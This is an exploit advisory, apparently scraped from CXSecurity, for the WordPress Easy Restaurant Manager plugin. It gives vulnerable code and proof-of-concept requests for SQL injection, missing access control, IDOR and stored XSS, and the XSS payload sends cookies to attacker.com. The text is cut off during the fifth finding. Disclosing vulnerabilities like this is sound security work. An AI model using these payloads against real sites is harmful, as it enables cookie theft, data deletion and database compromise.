---
title: WordPress Easy Restaurant Manager Plugin - Multiple Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2025040035
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-04-25
fetch_date: 2025-10-06T22:03:31.102348
---

# WordPress Easy Restaurant Manager Plugin - Multiple Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Easy Restaurant Manager Plugin - Multiple Vulnerabilities** **2025.04.24**  Credit:  **[bRpsd](https://cxsecurity.com/author/bRpsd/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
.:. Exploit Title > WordPress Easy Restaurant Manager Plugin - Multiple Vulnerabilities
.:. Date: April 19, 2025
.:. Exploit Author: bRpsd
.:. Contact: cy[at]live.no
.:. Vendor -> https://wordpress.org/plugins/easy-restaurant-manager/
.:. Tested Version -> 1.0
.:. DBMS -> MySQL
.:. Tested on > macOS [\*nix Darwin Kernel], on local xampp
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[+] Vulnerability #1: SQL Injection
Vulnerable Code:
==========================================================================================
public static function store($coupon) {
return Coupon::store($coupon);
}
public static function updateCoupon($coupon){
return Coupon::updateCoupon($coupon);
}
public static function deleteCoupon($id){
return Coupon::deleteCoupon($id);
}
$data = $request->get\_param('data');
$id = $data['id'];
==========================================================================================
Issue: These methods in CouponResource.php demonstrate how user-controlled input ($coupon, $id) is directly passed to model methods without any visible validation or sanitization. Similar patterns exist across multiple resource classes including ReservationResource, MenuResource, ColorResource, and TableResource. An attacker could exploit this by sending a malicious request to an endpoint that utilizes these methods:
POC1:
POST /wp-json/easy-restaurant-manager/v1/coupons
Content-Type: application/json
{
"name": "Discount",
"code": "' OR 1=1; -- ",
"discount\_type": "percentage",
"discount\_value": "10",
"added\_date": "2025-04-19",
"expiration\_date": "2025-05-19",
"status": "active"
}
POC2:
POST /wp-json/easy-restaurant-manage/v1/coupon
Content-Type: application/json
{
"data": {
"id": "1 OR 1=1"
}
}
[+] Vulnerability #2: Missing Access Control in Resource Methods
Vulnerable code:
==========================================================================================
public static function getReservation(){
return Reservation::getReservation();
}
public static function UpdateReservation($id, $status){
return Reservation::UpdateReservation($id, $status);
}
public static function deleteReservation($id){
return Reservation::deleteReservation($id);
}
================================================================================================================
Issue: The resource classes show no evidence of authentication or authorization checks before performing sensitive operations on data.These methods in ReservationResource.php handle sensitive operations without visible permission checks. This could allow unauthorized users to access, modify, or delete data if the API endpoints don't implement proper access controls.
POC:
An attacker could attempt to access or modify reservations belonging to other users by manipulating request parameters:
DELETE /wp-json/easy-restaurant-manager/v1/reservations/123
Without proper authorization checks, this could delete any reservation in the system, regardless of whether it belongs to the current user
[+] Vulnerability #3: Insecure Direct Object References (IDOR)
Vulnerable code:
================================================================================================================
public static function deleteMenu($id){
return Menu::deleteMenu($id);
}
================================================================================================================
Issue: This method in MenuResource.php potentially allows access to any menu item by its ID. Without proper access controls, an attacker could simply increment or modify ID values to access or modify resources belonging to other users or branches.By manipulating ID parameters in requests, an attacker could access unauthorized resources:
POC:
GET /wp-json/easy-restaurant-manager/v1/tables/5
GET /wp-json/easy-restaurant-manager/v1/tables/6
GET /wp-json/easy-restaurant-manager/v1/tables/7
[+] Vulnerability #4: Stored XSS
Vulnerable code:
================================================================================================================
public static function getTemplateSettings()
{
return get\_option('easy\_restaurant\_manger\_menus\_template\_settings', [
'primary\_color' => '#3498F5',
'secondary\_color' => '#6B3CEB',
'background\_color' => '#fff',
'font\_color' => '#253241',
'template' => 'classic',
'menu\_single\_page' => 'yes',
'category\_title' => 'OUR SPECIAL MENU',
'category\_short\_desc' => 'Enjoy the unique dishes from the best/elite restaurant that only our restaurant has. Fusce malesuada, lorem vitae euismod lobortis.',
'menus\_title' => 'Menus',
'menus\_short\_desc' => 'Enjoy the unique dishes from the best/elite restaurant that only our restaurant has. Fusce malesuada, lorem vitae euismod lobortis.',
]);
}
================================================================================================================
Issue: The ColorResource class handles template settings that are used in the frontend that can be adjusted by the user to cause stored XSS.The input is stored and later rendered without proper escaping.
An attacker could update color settings or descriptions with malicious JavaScript:
POC:
POST /wp-json/easy-restaurant-manager/v1/settings
Content-Type: application/json
{
"category\_short\_desc": "<script>document.location='https://attacker.com/steal.php?cookie='+document.cookie</script>"
}
[+] Vulnerability #5: Custom User Management Vulnerabilities
Code:
==========================================================================================
$sql = "CREATE TABLE IF NOT EXISTS `{$wpdb->prefix}erm\_users` (
id INT PRIMARY KEY AUTO\_INCREMENT,
branch\_id INT DEFAULT NULL,
name VARCHAR(255) NOT NULL,
email VARCHAR(255) UNIQUE NOT NULL,
phone VARCHAR(20) NOT NULL,
password VARCHAR(255) NOT NULL,
role ENUM('customer', 'admin', ...